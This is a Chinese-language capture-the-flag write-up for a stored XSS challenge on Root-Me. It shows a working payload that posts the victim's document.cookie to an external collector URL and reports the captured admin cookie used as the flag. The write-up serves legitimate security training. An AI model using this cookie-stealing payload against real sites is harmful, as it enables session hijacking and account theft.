## [[Root-Me](https://www.root-me.org/)] [[Web-Client](https://www.root-me.org/en/Challenges/Web-Client/)] [[XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)] [[解题报告](https://exp-blog.com/safe/ctf/rootme/web-client/xss-stored-1/)]

------

已经很直白提示是存储型 XSS 题型。

页面需要提交一个表单，在 Message 区测试注入一个 html 代码 `<img src=0 />`，提交后发现直接作为图片元素渲染。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B09%5D%20%5B30P%5D%20XSS%20-%20Stored%201/imgs/01.png)

打开浏览器的开发者工具查看，不难发现 Cookie 并没有标注 `HttpOnly` 属性，说明可以利用 `document.cookie` 发起 XSS 攻击。

多刷新几次页面，发现这台靶机后台有个机器人线程在定时读取我们提交的消息，当读取之后，该消息会被删掉，此时页面底部会提示 `Your messages have been read` 。

而我们要做的就是把 XSS 的 payloads 消息存储到后台，当机器人读取到这条消息时，就会把这个机器人的 Cookie 发送到我们的指定的一台服务器，实现 Cookie 窃取。

假设我们已经搭建了一台服务器 `${HOST}` ，那么可以在 Message 区构造一个这样的 payloads ：

`exp:<script>document.write("<img src=${HOST}?tk="+document.cookie+" />");</script>`

（注：此 payloads 建议直接在页面提交，若使用 Burp Suite 提交注意需要先把 `+` 编码成 `%2B` ，否则会导致服务器报错收不到消息）

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B09%5D%20%5B30P%5D%20XSS%20-%20Stored%201/imgs/02.png)

提交 payloads 消息后，就登录到 `${HOST}` 服务器守株待兔即可 (大概需要等5分钟)，只要机器人读取了这条消息，就能收到其 Cookie 。

对于这个 `${HOST}` 服务器，推荐使用 [RequestBin](https://requestbin.fullcontact.com/) 生成的临时 HTTP 服务器。例如你生成的 HTTP 服务的临时 URL 为 `http://requestbin.fullcontact.com/qnwgrmqn`，则把 payloads 修改为：

`exp:<script>document.write("<img src=http://requestbin.fullcontact.com/qnwgrmqn?tk="+document.cookie+" />");</script>`

当然你也可以选择自己实现一个 HTTP 服务器，但是必须有公网 IP。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B09%5D%20%5B30P%5D%20XSS%20-%20Stored%201/imgs/03.png)

最终收到的 Cookie 为：`ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6`，其值就是 flag，完成挑战。


![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B09%5D%20%5B30P%5D%20XSS%20-%20Stored%201/imgs/04.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
